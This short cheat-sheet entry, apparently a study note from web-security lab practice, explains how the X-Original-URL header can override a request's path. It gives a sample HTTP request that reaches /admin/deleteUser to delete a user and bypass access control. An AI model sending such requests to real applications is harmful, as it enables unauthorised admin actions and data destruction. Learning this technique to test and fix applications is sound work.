## X-Original-URL
Some application frameworks support various non-standard HTTP headers that can be used to override the URL in the original request, such as X-Original-URL and X-Rewrite-URL. Any URL params still need to be part of the original route (or maybe some parsers parse it from the X-Original-URL, i've no idea)
```
POST /?username=carlos HTTP/1.1
X-Original-URL: /admin/deleteUser
```
-> access control bypassed